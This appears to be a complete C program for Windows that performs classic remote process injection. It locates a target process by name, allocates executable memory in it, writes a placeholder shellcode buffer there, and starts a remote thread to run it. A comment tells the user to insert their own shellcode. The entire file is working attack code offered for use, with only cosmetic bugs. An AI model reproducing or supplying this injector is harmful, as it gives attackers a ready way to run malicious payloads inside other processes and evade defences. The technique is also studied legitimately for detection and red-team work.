#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define warn(msg, ...) wprintf(L"[-] " msg L"\n", ##__VA_ARGS__)
#define okey(msg, ...) wprintf(L"[+] " msg L"\n", ##__VA_ARGS__)
#define info(msg, ...) wprintf(L"[i] " msg L"\n", ##__VA_ARGS__)

HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
BOOL writeProcess = FALSE;
DWORD TID = NULL;
unsigned char shellcode[] =
"\xfc\x48..."; //make sure to add ur own shellcode here
size_t sizeS = sizeof(shellcode);

HANDLE findProcess(wchar_t* name) {
    HANDLE hProcessSnap, hProcessS = NULL;
    BOOL ProcessFirst = FALSE;
    PROCESSENTRY32 pe32;
   
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    ProcessFirst = Process32First(hProcessSnap, &pe32);
    if (!ProcessFirst) {
        warn(L"Error with ProcessFirst");
        CloseHandle(hProcessSnap);
        return NULL;
    }
    okey(L"looking for %s ", name);
    
    do {
        
        if (!wcscmp(pe32.szExeFile, name)) {
           
            hProcessS = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcessS) {
                CloseHandle(hProcessSnap);
                return hProcessS;
            }
            else {
                warn(L"Error with hProcess in findProcess");
                CloseHandle(hProcessSnap);
                return NULL;
            }
        }


    } while (Process32Next(hProcessSnap, &pe32));


}

int wmain(int argc, wchar_t* argv[]) {

    if (argc < 2) {
        warn(L"Use: %s Process_name", argv[0]);
        return 1;
    }
    info(L"Your argument is %s", argv[1]);
    hProcess = findProcess(argv[1]);
    
    if (!hProcess) {
        warn(L"failed to get Process from findProcess");
        return 1;
    }

    okey(L"the fucnction findProcess returned a process: ");
    info(L"%p", hProcess);

    okey(L"Time to make some virtual space");
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeS, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (!rBuffer) {
        warn(L"Failed to allocate space");
        CloseHandle(hProcess);
        return 1;
    }
    okey(L"We created a buffer! with this size: %ld", sizeS);
    okey(L"Time to write our shellcode to it now");

    writeProcess = WriteProcessMemory(hProcess, rBuffer, shellcode, sizeS, NULL);
    if (!writeProcess) {
        warn(L"Failed to write to the Process");
        CloseHandle(hProcess);
        return 1;
    }
    okey(L"We wrote to our process our injection");
    okey(L"Time to create a Thread");

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
    if (!hThread) {
        warn(L"Failed to create Thread, Error: %ld",GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    okey(L"We created a Thread with ID: %ld", &TID);

    WaitForSingleObject(hProcess, INFINITE);
    if (hThread){
        info(L"Closing the Thread");
        CloseHandle(hThread);
    }
    if (hProcess) {
        info(L"Closing the Process");
        CloseHandle(hProcess);
    }
    okey(L"We are Done!");
    return 0;
}

